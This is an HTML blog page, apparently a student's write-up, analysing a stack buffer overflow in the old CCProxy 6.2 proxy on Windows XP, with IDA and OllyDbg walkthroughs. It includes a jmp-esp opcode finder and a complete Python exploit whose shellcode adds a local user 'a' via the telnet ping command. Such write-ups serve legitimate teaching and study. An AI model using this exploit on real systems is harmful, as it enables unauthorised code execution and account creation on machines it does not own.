@@ -1,0 +1,812 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/warning.png">
+  <link rel="icon" href="/img/icon/warning.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0X00 前言最近看了点二进制的东西，正好学校里面有栈溢出的实验，就简单拿出来分析一下，CCPorxy 6.2 ,一个比较经典的 windows 下的栈溢出，因为是非常老的软件，而且我选择在 windows xp 中运行，因此这里并不涉及保护的问题，只是简单的分析一下。 0X01 先简单说一下溢出点该软件双击运行以后，可以在本机 telnet 127.0.0.1 ,然后再去 ping 一个 ip">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CCProxy6.2 栈溢出分析">
+<meta property="og:url" content="http://example.com/2019/06/13/CCProxy6.2%20%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0X00 前言最近看了点二进制的东西，正好学校里面有栈溢出的实验，就简单拿出来分析一下，CCPorxy 6.2 ,一个比较经典的 windows 下的栈溢出，因为是非常老的软件，而且我选择在 windows xp 中运行，因此这里并不涉及保护的问题，只是简单的分析一下。 0X01 先简单说一下溢出点该软件双击运行以后，可以在本机 telnet 127.0.0.1 ,然后再去 ping 一个 ip">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA1.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA2.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA3.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA4.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA5.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA6.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA7.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA8.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA9.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA10.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA11.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA12.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA13.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA14.png">
+<meta property="og:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA15.png">
+<meta property="article:published_time" content="2019-06-13T21:17:18.000Z">
+<meta property="article:modified_time" content="2025-01-24T15:18:53.787Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="二进制 栈溢出">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA1.png">
+  
+  
+  
+  <title>CCProxy6.2 栈溢出分析 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>K0rz3n&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner/icemountain.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CCProxy6.2 栈溢出分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-06-13 22:17" pubdate>
+          June 13, 2019 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CCProxy6.2 栈溢出分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>最近看了点二进制的东西，正好学校里面有栈溢出的实验，就简单拿出来分析一下，CCPorxy 6.2 ,一个比较经典的 windows 下的栈溢出，因为是非常老的软件，而且我选择在 windows xp 中运行，因此这里并不涉及保护的问题，只是简单的分析一下。</p>
+<h2 id="0X01-先简单说一下溢出点"><a href="#0X01-先简单说一下溢出点" class="headerlink" title="0X01 先简单说一下溢出点"></a><strong>0X01 先简单说一下溢出点</strong></h2><p>该软件双击运行以后，可以在本机 telnet 127.0.0.1 ,然后再去 ping 一个 ip 地址，我们的栈溢出的点就在这个 ping 后面的地址上</p>
+<p>当我们 Ping 正常地址的时候，以及 ping 一个不存在的地址的时候的反应是不同的，如下图</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA1.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<span id="more"></span>
+
+<p>当我们 ping 一个超长的(我这里选择的是 2000 个 A)不存在的地址的字符串的时候，程序会直接崩溃，如下图</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA2.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<p>说明程序在处理超长地址的时候出现了字符越界的问题，下面我们就用 IDA 静态分析一下</p>
+<h2 id="0X02-IDA-静态分析程序"><a href="#0X02-IDA-静态分析程序" class="headerlink" title="0X02 IDA 静态分析程序"></a><strong>0X02 IDA 静态分析程序</strong></h2><p>首先等待 ida 将程序装载完整，为了快速定位我们首先打开 string 窗口，对我们可能的溢出点进行搜索，特征就是 “Host not found…” 这个字符串</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA3.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<p>进入以后我们查看这个函数的交叉引用，定位到调用函数的位置</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA4.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA5.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<p>我们使用 F5 看一下源码，可以看到，我们的主机传进去就是 name ,然后我们会将其赋值到 buf 的缓冲区空间，然后造成了溢出</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA6.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<p>我们回过头看一下这个函数的调用情况</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA7.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<p>仔细观察他的 ebp 和 esp 的入站情况我们发现，这个程序的设计是不同寻常的，因为，我们往往的函数调用约定是先 push ebp 然后 mov ebp，esp 的,但这里直接先把 esp 提了上去，而 ebp 的位置是由 ecx 决定的，ecx 在前面又经过了非常多的转化，这就让我们通过 ebp 作为基址产生了困难，而且我们也发现上面很多的寻址都是通过 esp 作为基址的，于是这里我们转而使用 esp 作为我们定位 buf 位置的基址</p>
+<p>我们还是使用 F5 看一下 Buf 相对于esp 的偏移</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA8.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<p>可以看到是  esp+3Ch， 也就是 esp 下面 60 字节的位置，于是我们就很容易的计算出我们的溢出的偏移为 1012 字节。</p>
+<p>有了偏移量，我们下一步要考虑的就是将我们的返回地址覆盖成什么，我的想法首先是覆盖成 shellcode 的地址，但是我们知道栈的空间是不确定的，我们没法确定栈每次都是在那个位置，于是我们还有一种经典的方式是将返回地址覆盖成 jmp esp 的地址，然后让其执行 jmp esp 这条指令。</p>
+<h2 id="0X02-jmp-esp-地址的获取"><a href="#0X02-jmp-esp-地址的获取" class="headerlink" title="0X02 jmp esp 地址的获取"></a><strong>0X02 jmp esp 地址的获取</strong></h2><p>jmp esp 可以看成是一个跳板，在很多程序自带的函数库中都有很多的 jmp esp 的地址，因为这是一个图形化程序，必然自带了 user32.dll ，于是我们可以写程序在 user32.dll 中寻找 Jmp esp 的地址，然后随机选择一个来覆盖我们的返回值</p>
+<p><strong>代码如下：</strong></p>
+<p><strong>search_opcode.c</strong></p>
+<pre><code class="hljs">//FF E0		JMP EAX
+//FF E1		JMP ECX
+//FF E2		JMP EDX
+//FF E3		JMP EBX
+//FF E4		JMP ESP
+//FF E5		JMP EBP
+//FF E6		JMP ESI
+//FF E7		JMP EDI
+
+//FF D0		CALL EAX
+//FF D1		CALL ECX
+//FF D2		CALL EDX
+//FF D3		CALL EBX
+//FF D4		CALL ESP
+//FF D5		CALL EBP
+//FF D6		CALL ESI
+//FF D7		CALL EDI
+
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#define DLL_NAME &quot;user32.dll&quot;
+main()
+&#123;
+	BYTE* ptr;
+	int position,address;
+	HINSTANCE handle;
+	BOOL done_flag = FALSE;
+
+	handle=LoadLibrary(DLL_NAME);
+
+	if(!handle)
+	&#123;
+		printf(&quot; load dll erro !&quot;);
+		exit(0);
+	&#125;
+
+	ptr = (BYTE*)handle;
+	
+	for(position = 0; !done_flag; position++)
+	&#123;
+		try
+		&#123;
+			if(ptr[position] == 0xFF &amp;&amp; ptr[position+1] == 0xE4)
+			&#123;
+				//0xFFE4 is the opcode of jmp esp
+				int address = (int)ptr + position;
+				printf(&quot;OPCODE found at 0x%x\n&quot;,address);
+			&#125;
+		&#125;
+		catch(...)
+		&#123;
+			int address = (int)ptr + position;
+			printf(&quot;END OF 0x%x\n&quot;, address);
+			done_flag = true;
+		&#125;
+	&#125;
+&#125;
+</code></pre>
+<p>通过这个程序的运行，我们能找到很多的 jmp esp 的地址，我这里选择的是最后一个</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA9.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<h2 id="0X03-exp-py"><a href="#0X03-exp-py" class="headerlink" title="0X03 exp.py"></a><strong>0X03 exp.py</strong></h2><p>接下来就是编写 shellcode ，并且构造我们的 exp 来实现执行命令的操作了</p>
+<pre><code class="hljs">import socket
+import os
+
+sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+sock.connect((&#39;192.168.43.35&#39;,23))  
+s = sock.recv(4096)  
+
+p =b&#39;ping &#39; + b&#39;\x90&#39;*4                       
+jmp = b&#39;\xE9\x03\xFC\xFF\xFF\x90\x90\x90&#39; # 这里最后会布置到 esp+0xC 的地址，跳转到我们上面的 shellcode      
+
+shellcode= b&#39;\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x0C\xC6\x45\xF0\x6E\xC6\x45\xF1\x65\xC6\x45\xF2\x74\xC6\x45\xF3\x20\xC6\x45\xF4\x75\xC6\x45\xF5\x73\xC6\x45\xF6\x65\xC6\x45\xF7\x72\xC6\x45\xF8\x20\xC6\x45\xF9\x61\xC6\x45\xFA\x20\xC6\x45\xFB\x2F\xC6\x45\xFC\x61\xC6\x45\xFD\x64\xC6\x45\xFE\x64\x8D\x45\xF0\x50\xB8\xC7\x93\xBF\x77\xFF\xD0&#39;  
+junk = b&#39;a&#39;*920                    
+jmpesp = b&#39;\x79\x5b\xe3\x77&#39;            #jump esp 的地址,是从user32.dll中获取的
+
+
+p = p+jmp+shellcode+junk+jmpesp+b&#39;\x90&#39;*16       
+sock.send(p)                        
+sock.send(b&#39;\n&#39;)
+
+s = sock.recv(4096)
+print(s)
+</code></pre>
+<h2 id="0X04-OD-的动态调试"><a href="#0X04-OD-的动态调试" class="headerlink" title="0X04 OD 的动态调试"></a><strong>0X04 OD 的动态调试</strong></h2><p>因为 exp 并不是我写的，我只是简单地修改了一下原始的 exp ，所以我还是要对其进行一些分析，于是我选择使用动态调试工具 OD ，在 exp 打入以后进行单步跟踪调试</p>
+<p>首先在函数拷贝结束以后下断点，找到这个地址的方式是通过 ida 的静态分析获取的 sprintf 的地址，然后直接在 OD 中定位的</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA10.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<p>然后 F9 运行，然后直接打 exp ，然后运行到即将返回的时候的状态，如下图</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA11.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<p>首先我们要关注到 retn 0xC ，这说明在执行完这条指令的时候 esp 不只是会向高地址移动 4 字节，还会再继续向高地址移动 0xC 个字节，然后我们再来看右下角的栈区，我们发现此时 esp 移动后指向的是 0xFFFC03E9 ,这个刚好是我们 exp 中的 jmp 变量的值，并且这是一个负数，也就是一个相对的向低地址跳转的指令，也就是说虽然我们在 exp 中看似 jmp 在 shellcode 前面，但是实际上到了栈空间以后还是有所变化的</p>
+<p>然后我们调到 jmp esp 的地址 ，执行 jmp esp </p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA12.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<p>我们看到正如我们上面分析的，我们的 esp 已经跑到了 0xFFFC03E9 ,我们继续往下执行</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA13.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<p>此时相对地址已经被计算成为绝对地址，然后我们下一步就会跳转到我们的 shellcode </p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA14.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<p>该条指令的作用就是想计算机中添加一个名为 a 的用户</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA15.png" srcset="/img/loading.gif" lazyload alt="此处输入图片的描述"></p>
+<h2 id="0X05-补充分析"><a href="#0X05-补充分析" class="headerlink" title="0X05 补充分析"></a><strong>0X05 补充分析</strong></h2><p>计算偏移除了之前使用的 用 ida 去计算以外，我们还能使用随机字符串定位法去计算，我们首先生成比如 2000 个随机字符</p>
+<p><strong>rand.py</strong></p>
+<pre><code class="hljs">import random
+
+random_str = &#39;&#39;
+base_str = &#39;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#39;
+length = len(base_str) - 1
+for i in range(5000):
+    random_str += base_str[random.randint(0, length)]
+print(random_str)
+</code></pre>
+<p>然后我们将其打入程序，使用 OD 单步调试直到返回地址，我们会看到返回地址被哪四个字符淹没了，然后我们再去整个字符串中找那四个字符的位置</p>
+<p><strong>find.py</strong></p>
+<pre><code class="hljs">ori_str1 = &#39;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&#39;
+
+find_str = &#39;aBZ0&#39;
+
+print(ori_str1.find(find_str))
+</code></pre>
+<p>也可以算出来是 1012 字节</p>
+<h2 id="0X06-总结"><a href="#0X06-总结" class="headerlink" title="0X06 总结"></a><strong>0X06 总结</strong></h2><p>这个程序被奉为是比较经典的 windows 栈溢出实例，仔细分析以后能比较好的理解栈溢出的全过程，至于 shellcode 的书写，我们当然也可以用汇编自己写，然后使用 OD 导出来字节码，但是由于这个程序有一些奇怪的机制，使得 opcode 的写入顺序和实际顺序不太一样，就比较难写，我猜测可能是内部做了什么保护机制？不太明白，还需要继续努力。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" class="category-chain-item">二进制</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%88%E6%BA%A2%E5%87%BA/" class="print-no-link">#二进制 栈溢出</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CCProxy6.2 栈溢出分析</div>
+      <div>http://example.com/2019/06/13/CCProxy6.2 栈溢出分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>June 13, 2019</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/07/27/reGeorg%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90(%E4%BB%A5%20php%20%E4%B8%BA%E4%BE%8B)/" title="reGeorg 工作流程分析(以 php 为例)">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">reGeorg 工作流程分析(以 php 为例)</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/05/10/python3%20%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86(%E6%A1%86%E6%9E%B6%E7%AF%87)/" title="Python3 爬虫知识梳理(框架篇)">
+                        <span class="hidden-mobile">Python3 爬虫知识梳理(框架篇)</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
